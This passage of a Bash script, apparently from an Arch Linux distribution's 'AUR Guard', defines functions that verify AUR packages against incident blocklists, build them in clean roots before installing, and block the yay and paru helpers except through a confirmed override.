  if $hard_blocked; then
    _aur_guard_fail 'one or more available updates match the Awtarchy emergency blocklist'
    _AUR_GUARD_HISTORICAL_MATCHES=()
    return 1
  fi

  if _aur_guard_has_historical_matches; then
    _aur_guard_print_historical_summary
    _aur_guard_pass 'no emergency-blocked updates found; historical matches require full aurup verification and confirmation'
  else
    _aur_guard_pass 'no available AUR update names matched the emergency or historical incident lists'
  fi

  _AUR_GUARD_HISTORICAL_MATCHES=()
}

aurverify() {
  local pkg status

  if [[ $# -ne 1 ]]; then
    printf 'Usage: aurverify package_name\n' >&2
    printf 'Example: aurverify awtwall\n' >&2
    return 1
  fi

  pkg="$1"
  _aur_guard_validate_package_name "$pkg" || return 1

  if command pacman -Si "$pkg" >/dev/null 2>&1; then
    local repo_name
    repo_name=$(command pacman -Si "$pkg" 2>/dev/null | awk -F': ' '/^Repository/ {print $2; exit}')

    if ! _aur_guard_check_emergency_block "$pkg"; then
      _aur_guard_fail "$pkg is available from [$repo_name] but is explicitly emergency-blocked by Awtarchy"
      return 1
    fi

    printf 'AUR Verify: %s is available from enabled pacman repo [%s].\n' "$pkg" "$repo_name"
    printf 'Historical AUR incident lists do not apply to this repository package.\n'
    _aur_guard_pass "$pkg is handled by pacman. Nothing was installed."
    return 0
  fi

  _aur_guard_verify_tree "$pkg"
  status=$?

  if (( status == 0 )); then
    if _aur_guard_has_guarded_matches; then
      _aur_guard_print_historical_summary
      _aur_guard_print_context_summary
      _aur_guard_pass "$pkg and all required AUR dependencies passed enhanced verification. Review warnings remain. Nothing was installed."
    else
      _aur_guard_pass "$pkg and all required AUR dependencies passed verification. Nothing was installed."
    fi
  fi

  _aur_guard_cleanup_work
  return "$status"
}

aurup() {
  local pkg status

  if [[ $# -ne 1 ]]; then
    printf 'Usage: aurup package_name\n' >&2
    printf 'Example: aurup awtwall\n' >&2
    return 1
  fi

  pkg="$1"
  _aur_guard_validate_package_name "$pkg" || return 1

  if command pacman -Si "$pkg" >/dev/null 2>&1; then
    local repo_name
    repo_name=$(command pacman -Si "$pkg" 2>/dev/null | awk -F': ' '/^Repository/ {print $2; exit}')

    if ! _aur_guard_check_emergency_block "$pkg"; then
      _aur_guard_refuse_install "$pkg" "the package is explicitly emergency-blocked by Awtarchy, even though [$repo_name] currently provides it"
      return 1
    fi

    printf 'AUR Guard: %s is available from enabled pacman repo [%s].\n' "$pkg" "$repo_name"
    printf 'Historical AUR incident lists do not apply to this repository package.\n'
    printf 'Installing with pacman:\n  sudo pacman -S %s\n\n' "$pkg"
    sudo pacman -S "$pkg"
    return $?
  fi

  _aur_guard_verify_tree "$pkg"
  status=$?

  if (( status != 0 )); then
    _aur_guard_refuse_install "$pkg" 'recursive AUR verification failed'
    _aur_guard_cleanup_work
    return "$status"
  fi

  if ! _aur_guard_recheck_commits; then
    _aur_guard_refuse_install "$pkg" 'an AUR package changed after it was verified'
    _aur_guard_cleanup_work
    return 1
  fi

  if ! _aur_guard_build_verified_artifacts "$pkg"; then
    _aur_guard_refuse_install "$pkg" 'clean-root cache preparation, offline build/test, or artifact inspection failed'
    _aur_guard_cleanup_work
    return 1
  fi

  if ! _aur_guard_recheck_commits; then
    _aur_guard_refuse_install "$pkg" 'an AUR package changed after its artifact was built'
    _aur_guard_cleanup_work
    return 1
  fi

  if ! _aur_guard_confirm_guarded_install "$pkg"; then
    _aur_guard_refuse_install "$pkg" 'required warning confirmation was not accepted'
    _aur_guard_cleanup_work
    return 1
  fi

  if ! _aur_guard_install_verified_transaction "$pkg"; then
    _aur_guard_refuse_install "$pkg" 'the final verified pacman transaction failed'
    _aur_guard_cleanup_work
    return 1
  fi

  _aur_guard_pass "$pkg and every required AUR dependency were built in disposable clean roots and installed from reverified local artifacts."
  _aur_guard_cleanup_work
}

aurunsafe() {
  local helper="${1:-}"
  local answer

  shift || true

  case "$helper" in
    yay|paru)
      ;;
    *)
      printf 'Usage: aurunsafe yay|paru [args...]\n' >&2
      printf 'Example: aurunsafe yay -Syu\n' >&2
      return 1
      ;;
  esac

  if ! type -P "$helper" >/dev/null 2>&1; then
    printf '%s is not installed or not in PATH.\n' "$helper" >&2
    return 127
  fi

  printf '\033[1;31mUnsafe AUR override requested.\033[0m\n'
  printf 'This bypasses Awtarchy AUR Guard and runs raw %s.\n' "$helper"
  printf 'Type exactly YES to continue: '
  read -r answer

  if [[ "$answer" != 'YES' ]]; then
    printf 'Cancelled.\n'
    return 1
  fi

  command "$helper" "$@"
}

yay() {
  _aur_guard_block_message yay
  return 1
}

paru() {
  _aur_guard_block_message paru
  return 1
}
